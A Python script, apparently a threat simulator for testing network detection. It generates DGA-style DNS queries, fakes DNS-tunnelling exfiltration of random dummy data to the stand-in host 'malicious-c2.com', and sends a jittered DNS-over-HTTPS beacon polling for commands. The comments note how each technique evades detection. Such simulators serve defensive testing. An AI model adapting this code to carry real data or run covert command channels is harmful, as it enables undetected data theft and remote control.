import time
import random
import base64
import string
import socket
import requests
import _thread
from dnslib import DNSRecord, QTYPE

# Configuration
ATTACKER_DOMAIN = "malicious-c2.com"
DOH_TARGET = "https://8.8.8.8/dns-query" # Real DoH Resolver to simulate realistic path

def generate_random_data(size):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

def dga_generator(seed, count):
    """
    Simulates Domain Generation Algorithm (DGA) used by botnets.
    Generates random-looking domains like 'axbycz12.com'.
    """
    print(f"[DGA] Starting DGA Beaconing (Speed: Fast)...")
    random.seed(seed)
    tlds = [".com", ".net", ".org", ".info"]
    
    for i in range(count):
        length = random.randint(8, 20)
        domain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
        full_domain = domain + random.choice(tlds)
        
        try:
            # Send standard DNS query
            print(f"   [DGA] Query: {full_domain}")
            socket.gethostbyname(full_domain)
        except Exception:
            pass # Expected (domains don't exist)
            
        time.sleep(random.uniform(0.1, 0.5))

def data_exfiltration(target_domain, total_size_kb):
    """
    Simulates DNS Tunneling / Data Exfiltration.
    Encodes binary data into subdomains (e.g., 'base64chunk.attacker.com').
    """
    print(f"[EXFIL] Starting Data Exfiltration ({total_size_kb} KB)...")
    
    # Generate dummy sensitive data
    data = generate_random_data(total_size_kb * 1024)
    encoded_data = base64.b32encode(data.encode()).decode()
    
    # DNS allows ~63 chars per label
    chunk_size = 50 
    chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
    
    for i, chunk in enumerate(chunks):
        # Construct exfiltration domain
        exfil_domain = f"{chunk}.{target_domain}"
        
        try:
            # Simulate sending via A Record lookup
            print(f"   [EXFIL] Sending Chunk {i+1}/{len(chunks)}: {exfil_domain[:30]}...")
            socket.gethostbyname(exfil_domain)
        except Exception:
            pass
            
        time.sleep(0.05) # fast burst

def slow_doh_beacon(interval, jitter):
    """
    Simulates Low-and-Slow C2 Beaconing over DoH.
    Very hard to detect with volume metrics.
    """
    print(f"[BEACON] Starting Low-and-Slow DoH Beacon (Every ~{interval}s)...")
    headers = {"Content-Type": "application/dns-message"}
    
    while True:
        try:
            # C2 Command Polling
            domain = f"cmd-{random.randint(1000,9999)}.{ATTACKER_DOMAIN}"
            q = DNSRecord.question(domain, "TXT") # Check for commands in TXT records
            data = q.pack()
            
            # Send via HTTPS (Encrypted Beacon)
            requests.post(DOH_TARGET, data=data, headers=headers, timeout=5)
            print(f"   [BEACON] Heartbeat sent to {domain} (Encrypted)")
            
        except Exception:
            pass
            
        # Sleep with Jitter to evade timing analysis
        sleep_time = interval + random.uniform(-jitter, jitter)
        time.sleep(max(1, sleep_time))

def main():
    print("=== ADVANCED THREAT SIMULATOR ===")
    print("1. DGA Botnet Traffic")
    print("2. DNS Data Exfiltration (Tunneling)")
    print("3. Encrypted C2 Beaconing (DoH)")
    print("=================================")
    
    try:
        # Start scenarios in parallel
        
        # 1. DGA: 100 random domains
        _thread.start_new_thread(dga_generator, ("botnet-seed", 500))
        
        # 2. Exfiltration: Steal 100KB of data
        _thread.start_new_thread(data_exfiltration, (ATTACKER_DOMAIN, 50))
        
        # 3. Beacon: Pulse every 5 seconds +/- 2s jitter
        _thread.start_new_thread(slow_doh_beacon, (5, 2))
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n[STOP] Simulation stopped.")

if __name__ == "__main__":
    main()
